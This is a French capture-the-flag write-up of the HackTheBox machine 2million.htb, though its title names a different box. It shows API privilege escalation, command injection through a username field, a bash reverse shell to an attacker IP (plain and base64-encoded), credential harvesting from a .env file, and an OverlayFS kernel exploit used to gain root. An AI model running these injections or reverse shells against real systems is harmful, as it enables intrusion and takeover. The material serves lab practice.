---
title:  "HacktheBox WriteUp : MetaTwo"
category: HackTheBox
tag: writeups
---

### Scanner le réseau

`nmap 10.10.11.221 -sV -v`

- \-sV Tente de déterminer la version du service fonctionnant sur le port
- \-v verbeux

On découvre 2 ports ouverts (23 et 80), un service FTP et un service web.

On accède au site web avec l'adresse IP qui nous amène au nom de domaine `http://2million.htb`.

En cherchant sur le site, un onglet est disponible `http://2million.htb/invite` où on voit avec burp un fichier javascript étrangement obfusqué `inviteapi.min.js`.

On deobfusque avec [de4js](https://lelinhtinh.github.io/de4js/).
On y trouve une méthode intéressante :
```javascript
function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
```

En faisant une requête POST sur http://2million.htb/api/v1/invite/how/to/generate on récupère un message chiffré en ROT-13, qui donne après déchiffrage 
```
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

```HTTP
HTTP/1.1 200 OK
Date: Mon, 23 Oct 2023 20:24:42 GMT
Content-Type: application/json
Content-Length: 249misoko

{
"0":200,
"success":1,
"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr",
"enctype":"ROT13"},
"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

Après avoir fait une requête `POST` sur `/api/v1/invite/generate`, on obtient un code en base64
**VllKNUwtOFYwOFctWUExRzktS0xYTjI=** qui devient une fois décodé : **VYJ5L-8V08W-YA1G9-KLXN2**
```console
echo VllKNUwtOFYwOFctWUExRzktS0xYTjI= | base64 -d
```

# connection au site web
Une fois connecté à ce qui s'apparente à un ancien site de hackthebox, on cherche dans le site et on tombe sur la génération d'un fichier VPN pour se connecter à distance aux boxes.
On voit grâce à Burp que la génération du fichier vpn est obtenu grâce à l'appel d'une API `/api/v1/user/vpn/generate`.
Suite à celui, on investigue un peu l'api en cherchant à appeler les premières étapes du chemin 

```console
curl -sv 2million.htb/api/v1 --cookie "PHPSESSID=ci5i571j4glck8l421a9e12ib6" | jq
```
```json
{
  "v1": {                       
    "user": {                   
      "GET": {                  
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",                            
        "/api/v1/invite/generate": "Generate invite code",              
        "/api/v1/invite/verify": "Verify invite code",                  
        "/api/v1/user/auth": "Check if user is authenticated",          
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",  
        "/api/v1/user/vpn/download": "Download OVPN file"               
      },                        
      "POST": {                 
        "/api/v1/user/register": "Register a new user",                 
        "/api/v1/user/login": "Login with existing user"                
      }                         
    },                          
    "admin": {                  
      "GET": {                  
        "/api/v1/admin/auth": "Check if user is admin"                  
      },                        
      "POST": {                 
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"  
      },                        
      "PUT": {                  
        "/api/v1/admin/settings/update": "Update user settings"         
      }                         
    }                           
  }                             
}  
```

On joue avec l'API ce qui donne :
```
curl -sv -X PUT 2million.htb/api/v1/admin/settings/update 
--cookie "PHPSESSID=ci5i571j4glck8l421a9e12ib6" | jq
{
  "status": "danger",
  "message": "Invalid content type."
}   
```
On voit qu'on n'obtient pas d'erreur 401 UnAuthorize sur ce endpoint. On sait que l'API répond en JSON, donc on peut adapter la commande.

```console
curl -X PUT http://2million.htb/api/v1/admin/settings/update 
--cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" 
--header "Content-Type: application/json" | jq

{
"status":"danger",
"message": "Missing parameter:email"              
}    
```
## FootHold

On ajoute donc le paramètre :
```
curl -sv -X PUT 2million.htb/api/v1/admin/settings/update 
--cookie "PHPSESSID=ci5i571j4glck8l421a9e12ib6" 
--header "Content-Type: application/json" 
--data '{"email":"test2@gmail.com"}'| jq

{
  "status": "danger",
  "message": "Missing parameter: is_admin"
} 
```

On finit par ajouter le paramètre admin :
`--data '{"email":"test2@gmail.com", "is_admin" : 1}`

On peut vérifier que l'appel à l'API a bien été pris en compte : 
```
misoko㉿kali-[~/Documents/TwoMillion]
└─$ curl -sv -X GET 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=ci5i571j4glck8l421a9e12ib6" | jq 
{
  "message": true                                                         
}    
```

On essaye de générer un fichier de configuration VPN en tant qu'admin avec son nom d'utilisateur.

```
curl -sv -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=ci5i571j4glck8l421a9e12ib6" --header "Content-Type: application/json" --data '{"username":"test2"}'
```

On voit que cela fonctionne.
Maintenant, si ce VPN est généré par la fonction PHP `exec` ou `system` et qu'il n'y a pas de filtrage ou un filtrage insuffisant ***- ce qui est possible puisqu'il s'agit d'une fonction accessible aux admins seulement -*** il peut être d'injecter un code malveillant dans le champ du nom d'utilisateur.

En modifiant le dernier paramètre en `--data '{"username":"test2;id;"}'`, on voit une réponse fournie `uid=33(www-data) gid=33(www-data) groups=33(www-data)`.

Maintenant que l'on peut exécuter des commandes, on va faire en sorte d'avoir un termimal en utilisant un reverseshell.

<u>Côté victime</u>
`bash -i >& /dev/tcp/10.10.14.194/1234 0>&1`

<u>Côté attaquant</u>
`nc -nlvp 1234`

> Important!!! On pense à mettre en base64 le code côté victime vu le nombre de caractères spéciaux, sinon le code ne s'exécutera pas.
On utilise echo bash -i >& /dev/tcp/10.10.14.194/1234 0>&1 |base64

On a donc :
```console
curl -v -X POST 2million.htb/api/v1/admin/vpn/generate 
--cookie "PHPSESSID=ci5i571j4glck8l421a9e12ib6" --header "Content-Type: application/json" 
--data '{"username":"test2;
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOTQvMTIzNCAwPiYxCg== 
|base64 -d | bash;"}'
```

## Mouvement lateral


En énumérant le répertoire sur lequel on arrive, on constate un fichier `.env` contenant des credentials.
```
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

On peut se connecter en admin avec le pass précédent :
```console 
su - admin
```

En se connectant à la base mysql, on peut voir qu'on obtient des hash de plusieurs utilisateurs.
Les commandes pour y arriver sont :
```console
which mysql
mysql -u admin -p     // On utilise le password du fichier précédent
show databases;
use htb_prod;
show tables;
show * in users;
```


Pour chercher des informations sur l'utilisateur admin sur linux :
```console
find / -user admin 2>/dev/null | grep -v '^/run\|^/proc\|^/sys 
```

On voit divers dossiers/fichiers, donc un message dans `/var/mail/admin` :

```
Hey admin,

I'm know you're working as fast as you can to do the DB migration. 
While we're partially down, can you also upgrade the OS on our web host?
There have been a few serious Linux kernel CVEs already this year.
That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

On peut avoir des informations sur le noyau/système/architecture de la machine à l'aide de la commande 
`uname -a`.

Après une recherche sur google de "OverlayFS exploit", on tombe sur [ce post](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/), qui montre la preuve de concept en utilisant les commandes suivantes :

```console
admin@2million:~$ id
    uid=1000(admin) gid=1000(admin) groups=1000(admin)
admin@2million:~$ unshare --user --map-user 0
root@2million:~# id
    uid=0(root) gid=65534(nogroup) groups=65534(nogroup)
```
Mais l'accès au root n'est pas disponible.

On utilise l'exploit disponible dans ce [github](https://github.com/sxlmnwb/CVE-2023-0386/tree/master) pour devenir root, et obtenir le flag dans `/root`.